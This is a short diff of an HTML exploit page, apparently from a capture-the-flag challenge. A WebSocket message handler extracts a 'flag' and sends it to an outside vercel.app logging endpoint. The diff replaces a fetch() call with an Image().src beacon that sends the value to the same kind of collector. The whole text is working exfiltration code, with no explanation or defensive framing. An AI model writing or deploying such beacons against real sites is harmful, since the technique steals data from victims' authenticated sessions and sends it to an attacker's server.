@@ -11,9 +11,8 @@
       ws.onmessage = ev => {
         const flag = JSON.parse(ev.data).message;
 
-        fetch('https://baicuooi-hados-projects-88750053.vercel.app/api/log?flag=' + encodeURIComponent(flag), {
-          mode: 'no-cors'
-        });
+        new Image().src = 'https://baicuooi-git-master-hados-projects-88750053.vercel.app/api/log?flag=' + encodeURIComponent(flag);
+        console.log(flag);
       };
     </script>
   </body>
